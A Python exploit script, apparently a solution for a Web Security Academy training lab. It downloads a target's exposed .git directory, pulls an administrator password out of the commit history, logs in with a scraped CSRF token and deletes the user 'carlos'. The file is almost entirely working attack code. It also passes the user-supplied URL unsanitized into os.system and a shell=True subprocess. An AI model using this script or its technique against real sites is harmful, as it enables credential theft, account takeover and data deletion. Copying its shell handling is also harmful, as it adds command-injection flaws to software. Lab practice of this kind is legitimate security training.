#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import os
import subprocess
from argparse import RawTextHelpFormatter
from bs4 import BeautifulSoup

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Information Disclosure Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "/.git" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "/.git"

Information disclosure in version control history solution: /.git
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: /.git', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command
s = requests.Session()

def admin_login(url, pass_admin, csrf):
    data = {
        "csrf": csrf,
        "username": "administrator",
        "password": pass_admin
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        s.post(url + '/login', data=data, verify=False, proxies=proxies)
    else:
        r = s.post(url + '/login', data=data, verify=False, allow_redirects=False)
        cookie_dict = r.cookies.get_dict()
        session = cookie_dict['session']
        del_carlos_path = "/admin/delete?username=carlos"
        r1 = s.get(url + del_carlos_path, verify=False, headers={"Cookie":"session=" + session})
        if (b'carlos' not in r1.content):
            print("(+) Carlos user is deleted")
            print("(+) Information Disclosure Successful")
        else:
            print("(-) Information Disclosure Failed")

def get_csrf_token(url):
    login_path = '/login'
    r = s.get(url + login_path, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    global csrf
    csrf = soup.find("input")['value']
    return csrf

def admin_pass(url):
    git_url = url + command
    os.chdir("/tmp")
    os.system("wget --recursive " + git_url)
    folder = url.split("//")[1]
    git_folder = folder + "/.git"
    os.chdir(git_folder)
    password = subprocess.check_output("git log -p | grep -m 1 ADMIN_PASSWORD | cut -d \"=\" -f 2", shell=True)
    global pass_admin
    pass_admin = password.decode("utf-8").rstrip('\n')
    return pass_admin

def main():
    
    print("(+) Information Disclosure")

    admin_pass(url)

    get_csrf_token(url)
    
    admin_login(url, pass_admin, csrf)

if __name__ == "__main__":
    main()
